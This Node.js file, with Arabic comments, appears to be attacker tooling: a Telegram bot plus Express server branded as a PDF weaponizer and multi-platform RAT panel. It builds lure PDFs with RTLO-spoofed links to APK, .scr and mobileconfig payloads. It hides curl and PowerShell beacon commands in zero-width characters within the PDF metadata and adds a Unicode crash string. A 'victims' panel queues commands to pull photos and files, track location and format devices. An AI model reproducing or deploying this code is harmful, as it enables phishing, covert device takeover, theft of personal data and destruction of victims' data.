#!/usr/bin/env node
// ============================================================
// ARCHITECT TELEGRAM PDF WEAPONIZER + MULTI-PLATFORM RAT PANEL
// (Self-Hosted Server Edition - Polling + Express API)
// ============================================================
// "جاهز سيدي المطور" - يقرأ BOT_TOKEN, ADMIN_ID, SERVER_IP, PORT
// ============================================================

const TelegramBot = require('node-telegram-bot-api');
const { PDFDocument, StandardFonts, rgb } = require('pdf-lib');
const sharp = require('sharp');
const express = require('express');

// ==============================================
// قراءة المتغيرات من بيئة النظام (Environment Variables)
// ==============================================
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_ID = parseInt(process.env.ADMIN_ID);
const SERVER_IP = process.env.SERVER_IP;          // IP السيرفر العام
const PORT = process.env.PORT || 10000;           // منفذ API (افتراضي 10000)

if (!BOT_TOKEN || !ADMIN_ID || !SERVER_IP) {
    console.error('❌ BOT_TOKEN, ADMIN_ID, and SERVER_IP must be set in environment variables!');
    process.exit(1);
}

const SERVER_URL = `http://${SERVER_IP}:${PORT}`;  // يُستخدم داخل الحمولات

// ==============================================
// قاعدة بيانات الضحايا (في الذاكرة)
// ==============================================
const victims = new Map(); // victim_id -> { os, name, lastSeen, pendingCommands }

// ==============================================
// Zero-Width + RTLO Exploit Generator (Multi-Platform)
// ==============================================
const ZW_MAP = { '0': '\u200B', '1': '\u200C', 'B': '\u200D', 'E': '\uFEFF' };

function generateCrashTrap() {
    const rlo = '\u202E'.repeat(4096);
    const lre = '\u202A'.repeat(2048);
    const pdf = '\u202C';
    return rlo + '['.repeat(1024) + lre + ']'.repeat(1024) + pdf;
}

function binaryToZeroWidth(data) {
    let bitStr = '';
    for (let i = 0; i < data.length; i++) {
        bitStr += data[i].toString(2).padStart(8, '0');
    }
    let encoded = '';
    for (const bit of bitStr) {
        encoded += ZW_MAP[bit];
    }
    return encoded + ZW_MAP['E'];
}

function generatePayloadStub(targetOS = 'android') {
    // حمولة بسيطة لتسجيل الضحية عند تنفيذها
    if (targetOS === 'android') {
        // لأندرويد: استخدام curl لإرسال device_id والاسم
        const cmd = `curl -s ${SERVER_URL}/api/register -d '{"device_id":"$(settings get secure android_id)","os":"Android","name":"$(getprop ro.product.model)"}'`;
        return Buffer.from(cmd, 'utf8');
    } else if (targetOS === 'windows') {
        // لويندوز: PowerShell
        const cmd = `powershell -Command "Invoke-WebRequest -Uri ${SERVER_URL}/api/register -Method POST -Body '{\\"device_id\\":\\"$env:COMPUTERNAME\\",\\"os\\":\\"Windows\\",\\"name\\":\\"$env:USERNAME\\"}'"`;
        return Buffer.from(cmd, 'utf8');
    } else {
        // iOS أو غير معروف
        const cmd = `curl -s ${SERVER_URL}/api/register -d '{"device_id":"unknown","os":"iOS","name":"iPhone"}'`;
        return Buffer.from(cmd, 'utf8');
    }
}

async function createWeaponizedPDF(imageBuffer, targetOS = 'android') {
    const pdfDoc = await PDFDocument.create();
    const page = pdfDoc.addPage([595, 842]);
    const font = await pdfDoc.embedFont(StandardFonts.Helvetica);

    // 1. تضمين الصورة
    let image;
    try {
        const pngImage = await sharp(imageBuffer).png().toBuffer();
        image = await pdfDoc.embedPng(pngImage);
    } catch {
        const jpgImage = await sharp(imageBuffer).jpeg().toBuffer();
        image = await pdfDoc.embedJpg(jpgImage);
    }
    const imgDims = image.scale(0.5);
    page.drawImage(image, {
        x: (595 - imgDims.width) / 2,
        y: (842 - imgDims.height) / 2,
        width: imgDims.width,
        height: imgDims.height,
    });

    // 2. صياغة رابط تنزيل خبيث (RTLO)
    let downloadUrl, fileName;
    if (targetOS === 'android') {
        downloadUrl = `${SERVER_URL}/payloads/android.apk`;  // يجب رفع APK لهذا المسار
        fileName = 'تحديث_الأمان.apk';
    } else if (targetOS === 'windows') {
        downloadUrl = `${SERVER_URL}/payloads/document.exe`;
        fileName = 'فاتورة_مستحقة.scr';
    } else {
        downloadUrl = `${SERVER_URL}/payloads/config.mobileconfig`;
        fileName = 'تثبيت_الشهادة.mobileconfig';
    }

    const spoofedName = fileName.split('.').reverse().join('.');
    const rtloSpoof = `\u202E${spoofedName}\u202C`;

    page.drawText(`للوصول إلى المحتوى، يرجى تنزيل الملف المرفق:\n${rtloSpoof}`, {
        x: 50,
        y: 100,
        size: 12,
        font,
        color: rgb(0, 0, 0.8),
    });

    // رابط قابل للنقر
    const linkAnnotation = pdfDoc.context.obj({
        Type: 'Annot',
        Subtype: 'Link',
        Rect: [50, 90, 400, 110],
        Border: [0, 0, 0],
        A: { Type: 'Action', S: 'URI', URI: downloadUrl },
    });
    page.node.addAnnot(linkAnnotation);

    // 3. حقن Zero-Width Exploit (للثغرات الأمنية)
    const stub = generatePayloadStub(targetOS);
    const hiddenPayload = binaryToZeroWidth(stub) + generateCrashTrap();
    pdfDoc.setAuthor(hiddenPayload);
    pdfDoc.setTitle(`DOC_${Math.random().toString(36).substring(2, 8).toUpperCase()}`);
    pdfDoc.setSubject('مستند سري');
    pdfDoc.setCreator('Adobe Acrobat');
    pdfDoc.setProducer('GhostWeaver v5.0');

    return Buffer.from(await pdfDoc.save());
}

// ==============================================
// إعداد بوت تيليجرام (وضع Polling - بدون Webhook)
// ==============================================
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

bot.onText(/\/start/, (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    bot.sendMessage(msg.chat.id,
        '🖤 *جاهز سيدي المطور.*\n\n' +
        '⚡ *الوحش يعمل على سيرفر خاص*\n\n' +
        '📋 *الأوامر:*\n' +
        '/pdf_android - صنع PDF لأندرويد\n' +
        '/pdf_windows - صنع PDF لويندوز\n' +
        '/pdf_ios - صنع PDF للآيفون\n' +
        '/panel - لوحة التحكم بالضحايا\n\n' +
        '📸 *أرسل صورة بعد اختيار نوع الحمولة.*',
        { parse_mode: 'Markdown' }
    );
});

const userPayloadType = new Map();

bot.onText(/\/pdf_(android|windows|ios)/, (msg, match) => {
    if (msg.from.id !== ADMIN_ID) return;
    const type = match[1];
    userPayloadType.set(msg.from.id, type);
    bot.sendMessage(msg.chat.id, `✅ تم تحديد الحمولة: *${type}*\n📸 أرسل الصورة الآن.`, { parse_mode: 'Markdown' });
});

bot.on('photo', async (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    const payloadType = userPayloadType.get(msg.from.id) || 'android';
    const waitMsg = await bot.sendMessage(msg.chat.id, '🔄 *جاري بناء PDF ملغوم...*', { parse_mode: 'Markdown' });
    try {
        const fileId = msg.photo[msg.photo.length - 1].file_id;
        const file = await bot.getFile(fileId);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
        const response = await fetch(fileUrl);
        const imageBuffer = Buffer.from(await response.arrayBuffer());
        const pdfBuffer = await createWeaponizedPDF(imageBuffer, payloadType);
        await bot.sendDocument(msg.chat.id, pdfBuffer, {
            filename: `مستند_${payloadType}.pdf`,
            caption: `💣 *PDF جاهز*\nالنظام: ${payloadType}\nالسيرفر: ${SERVER_URL}\n\n⚠️ للاستخدام المصرح فقط.`,
            parse_mode: 'Markdown'
        });
        await bot.deleteMessage(msg.chat.id, waitMsg.message_id);
    } catch (e) {
        await bot.editMessageText(`❌ خطأ: ${e.message}`, { chat_id: msg.chat.id, message_id: waitMsg.message_id });
    }
});

bot.onText(/\/panel/, (msg) => {
    if (msg.from.id !== ADMIN_ID) return;
    if (victims.size === 0) return bot.sendMessage(msg.chat.id, '⚠️ لا يوجد ضحايا متصلين بعد.');
    let list = '👥 *الضحايا المتصلون:*\n\n';
    for (const [id, data] of victims) {
        list += `🆔 \`${id.slice(0,8)}\` | ${data.os} | ${data.name}\n`;
    }
    const keyboard = {
        reply_markup: {
            inline_keyboard: Array.from(victims.entries()).map(([id, data]) => ([
                { text: `🎯 ${data.name} (${data.os})`, callback_data: `select:${id}` }
            ]))
        }
    };
    bot.sendMessage(msg.chat.id, list + '\nاختر ضحية للتحكم:', { ...keyboard, parse_mode: 'Markdown' });
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    await bot.answerCallbackQuery(query.id);

    if (data.startsWith('select:')) {
        const victimId = data.split(':')[1];
        const victim = victims.get(victimId);
        if (!victim) return bot.editMessageText('⚠️ الضحية غير متصل.', { chat_id: chatId, message_id: query.message.message_id });
        const commands = [
            [{ text: '📸 سحب الصور', callback_data: `${victimId}:gallery` }],
            [{ text: '📁 سحب الملفات', callback_data: `${victimId}:files` }],
            [{ text: '📱 اهتزاز', callback_data: `${victimId}:vibrate` }],
            [{ text: '📍 الموقع', callback_data: `${victimId}:location` }],
            [{ text: '💣 فرمتة', callback_data: `${victimId}:format` }],
        ];
        return bot.editMessageText(`التحكم بـ *${victim.name}* (${victim.os})`, {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: { inline_keyboard: commands },
            parse_mode: 'Markdown'
        });
    }

    const [victimId, cmd] = data.split(':');
    const victim = victims.get(victimId);
    if (!victim) return bot.editMessageText('⚠️ الضحية غير متصل.', { chat_id: chatId, message_id: query.message.message_id });
    victim.pendingCommands = victim.pendingCommands || [];
    victim.pendingCommands.push(cmd);
    await bot.editMessageText(`✅ أُرسل الأمر: ${cmd}`, { chat_id: chatId, message_id: query.message.message_id });
});

// ==============================================
// Express API لاستقبال الضحايا وتبادل الأوامر
// ==============================================
const app = express();
app.use(express.json({ limit: '50mb' }));

app.post('/api/register', (req, res) => {
    const { device_id, os, name } = req.body;
    if (!device_id) return res.status(400).json({ error: 'Missing device_id' });
    victims.set(device_id, { os, name, lastSeen: new Date().toLocaleString(), pendingCommands: [] });
    bot.sendMessage(ADMIN_ID, `🟢 *ضحية جديدة*\n🆔 \`${device_id}\`\n💻 ${os} - ${name}`, { parse_mode: 'Markdown' });
    res.json({ status: 'ok' });
});

app.post('/api/poll', (req, res) => {
    const { device_id } = req.body;
    const victim = victims.get(device_id);
    if (!victim) return res.json({ commands: [] });
    victim.lastSeen = new Date().toLocaleString();
    const commands = victim.pendingCommands || [];
    victim.pendingCommands = [];
    res.json({ commands });
});

app.post('/api/upload', async (req, res) => {
    const { device_id, type, data } = req.body;
    if (type === 'photo') {
        try { await bot.sendPhoto(ADMIN_ID, Buffer.from(data, 'base64'), { caption: `📸 من ${device_id}` }); } catch {}
    }
    res.json({ status: 'ok' });
});

// خدمة الملفات الثابتة (لتقديم الحمولات)
app.use('/payloads', express.static('payloads'));

// ==============================================
// تشغيل السيرفر
// ==============================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 API Server running on ${SERVER_URL}`);
    console.log(`🤖 Telegram Bot started in polling mode.`);
    console.log(`🖤 جاهز سيدي المطور.`);
});
